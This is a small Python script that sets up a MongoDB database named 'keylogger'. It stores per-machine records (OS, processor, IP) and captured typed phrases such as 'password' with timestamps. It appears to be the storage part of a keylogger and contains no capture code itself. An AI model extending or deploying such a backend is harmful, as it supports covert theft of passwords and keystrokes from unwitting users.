from pymongo import MongoClient
from models.user import User
from models.phrasestroke import PhraseStroke

def setup_database():
    global users, phrases, db, client
    client = MongoClient()
    reset_database()
    db = client['keylogger']
    users = db['users']
    phrases = db['phrases']


def reset_database():
    client.drop_database('keylogger')


def get_user_id(user):
    return users.find_one(user)


def insert_user(user):
    user_dict = user.__dict__
    return users.insert_one(user_dict)
    #return users.insert_one(user)


def insert_phrase(user, phrases_list):
    for p in phrases_list:
        user_id = get_user_id(user)
        if user_id is None:
            print("Creating user")
            user_id = insert_user(user)
        phrase = p.__dict__
        phrase['user_id'] = str(user_id)
        phrases.insert_one(phrase)


users, phrases, db, client = None, None, None, None
setup_database()
UserOne = User()
print(UserOne.__dict__)
UserOne = {"processor" : "proc",
           "os" : "Windows",
           "x86" : "x86sure",
           "ip" : "123.456.789.111",
           "image" : "dfhdbc"}
PhraseOne = {"end_timestamp" : "01/02/03:01:02:03",
             "duration": "10",
             "phrase" : "password",
             "terminating" : "return"}
PhraseTwo = {"end_timestamp" : "03/03/04:04:42:43",
             "duration": "5",
             "phrase" : "pwd",
             "terminating" : "enter"}
#insert_user(UserOne)
#insert_phrase(UserOne, [PhraseOne, PhraseTwo])

